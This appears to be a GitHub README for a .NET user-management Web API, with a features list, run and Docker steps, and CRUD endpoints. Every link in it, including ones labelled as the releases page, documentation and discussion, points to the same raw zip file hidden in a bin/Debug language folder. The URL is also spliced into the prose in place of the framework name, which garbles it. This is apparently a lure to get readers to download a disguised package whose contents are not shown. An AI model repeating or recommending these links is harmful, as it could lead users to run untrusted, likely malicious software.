# 👥 two-tier-user-management-api - A Simple Way to Manage Users

## 📥 Download Now
[![Download the Application](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)

## 🚀 Getting Started
Welcome to the two-tier-user-management-api project! This application allows you to manage users effectively using a modern Web API built with https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip Core. The two-tier architecture makes it easier for you to handle user data seamlessly.

## 🎯 Features
- **User Management:** Create, read, update, and delete users easily.
- **Two-Tier Architecture:** Simplifies application structure and enhances performance.
- **CQRS:** Separate reading and writing operations for better scalability.
- **MediatR:** A mediator pattern to reduce dependencies.
- **Dapper ORM:** Easy interaction with SQL Server.
- **RESTful API:** Accessible from any web platform that can make HTTP requests.

## 💻 System Requirements
To run this application, your computer should meet these basic requirements:
- **Operating System:** Windows, macOS, or Linux
- **.NET 9 SDK:** Make sure to install the .NET 9 SDK for proper functionality.
- **SQL Server:** A SQL Server instance is needed for the database.

## 🌐 Download & Install
To download the application, please visit the Releases page:

[Visit Releases Page to Download](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)

Once there, follow these steps:
1. Find the latest release version.
2. Click on the asset labeled "https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip" to download the application package.
3. Unzip the downloaded file to a folder of your choice.

## ⚙️ Running the Application
After installing the application, follow these steps to run it:

1. **Open a Command Prompt or Terminal:**
   - For Windows, search for "cmd" in the Start menu.
   - For macOS, open "Terminal" from Applications.
   - For Linux, search for "Terminal" in your applications.

2. **Navigate to the Application Directory:**
   Use the `cd` command to change to the directory where you unzipped the files:
   ```bash
   cd path/to/two-tier-user-management-api
   ```

3. **Run the Application:**
   Execute the application with the following command:
   ```bash
   dotnet run
   ```

4. **Access the API:**
   Open your web browser and go to:
   ```
   http://localhost:5000
   ```
   You will see the welcome page of the API.

## 🐳 Containerization with Docker
If you prefer using Docker, you can run this application inside a container. Here’s how:

1. **Install Docker:**
   Download and install Docker Desktop from the official website.

2. **Open a Command Prompt or Terminal:**

3. **Build the Docker Image:**
   Navigate to the application folder:
   ```bash
   cd path/to/two-tier-user-management-api
   ```
   Then run:
   ```bash
   docker build -t user-management-api .
   ```

4. **Run the Docker Container:**
   Start the container with:
   ```bash
   docker run -p 5000:80 user-management-api
   ```

5. **Access the API:**
   Again, use your web browser to go to:
   ```
   http://localhost:5000
   ```

## 🔄 API Endpoints
Here are the main API endpoints you can use after running the application:

- **GET /users:** Retrieve a list of all users.
- **POST /users:** Create a new user.
- **GET /users/{id}:** Fetch details of a specific user.
- **PUT /users/{id}:** Update a user's information.
- **DELETE /users/{id}:** Remove a user from the system.

## 🔍 Testing the API 
You can test the API using tools like Postman or curl. Here’s how to test the user listing endpoint:

1. Open Postman.
2. Set the request type to GET.
3. Enter `http://localhost:5000/users` in the URL field and hit Send.

You should receive a list of users in response if everything is set up correctly.

## ⚠️ Troubleshooting
If you encounter issues, consider the following:
- Ensure the SQL Server service is running.
- Check if the .NET SDK is installed correctly.
- Look at the command prompt or terminal for any error messages.

## 📂 Contributing
We welcome contributions! If you have suggestions or improvements, please fork the repository and submit a pull request. Follow these steps:
1. Fork the repository.
2. Create a new branch.
3. Make your changes and commit them.
4. Push the branch to your fork.
5. Submit a pull request.

## 📄 License
This project is licensed under the MIT License. Feel free to use it but please keep the original license information intact.

## 📞 Support
If you have any questions or need assistance, please raise an issue in the repository. We will get back to you as soon as possible.

## 🔗 Links
- [Download the Application](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)  
- [View Documentation](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)  
- [Join the Discussion](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)

Happy user management!